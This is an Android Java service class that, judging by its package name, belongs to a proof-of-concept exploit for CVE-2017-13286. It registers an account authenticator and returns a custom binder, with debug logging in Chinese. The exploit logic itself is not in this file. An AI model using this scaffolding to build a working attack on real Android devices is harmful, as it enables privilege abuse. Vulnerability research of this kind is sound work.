package com.cve.poc201713286;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

import androidx.annotation.Nullable;

public class AuthenticatorService extends Service {
    public AuthenticatorService() {
        Log.e("yes"," AuthenticatorService构造器被执行了");
    }

    @Override
    public void onCreate() {
        Log.e("yes"," AuthenticatorService被执行了");
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        MyAuthenticator authenticator = new MyAuthenticator(this);
        Log.e("yes"," AuthenticatorService Onbind被执行了");
        return authenticator.getIBinder();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }


}